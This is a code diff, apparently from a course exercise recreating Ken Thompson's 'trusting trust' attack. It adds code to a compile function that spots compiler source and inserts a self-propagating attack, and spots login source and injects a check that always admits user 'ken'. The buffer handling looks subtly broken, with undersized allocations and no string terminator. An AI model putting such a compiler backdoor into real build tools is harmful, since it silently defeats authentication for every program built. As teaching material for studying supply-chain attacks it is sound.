@@ -30,11 +30,26 @@ static void compile(char *program, char *outname) {
     static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
 
     /* your code goes here */
-	char* login_ptr;
-	char* new_prog = (char*)malloc(strlen(program) + strlen(login_sig));
+	
+	char* new_prog;
 
+	// identity attack follows here
+	char* compile_ptr;
+	 
+	if(compile_ptr = strstr(program, compile_sig)) {
+		new_prog = (char*)malloc(strlen(program) + strlen(compile_sig));
+		strncpy(new_prog, program, compile_ptr-program);
+		strcat(new_prog, compile_sig);
+		strcat(new_prog, compile_attack);
+		char* remaining_prog = compile_ptr + strlen(compile_sig);
+		strcat(new_prog, remaining_prog);
+	}
+	
+	// login attack follows here
+	char* login_ptr;
+	
 	if((login_ptr = strstr(program, login_sig))) {
-		printf("Found substring!\n");
+		new_prog = (char*)malloc(strlen(program) + strlen(login_sig));
 		strncpy(new_prog, program, login_ptr-program);
 		strcat(new_prog, login_sig);
 		strcat(new_prog, login_attack);
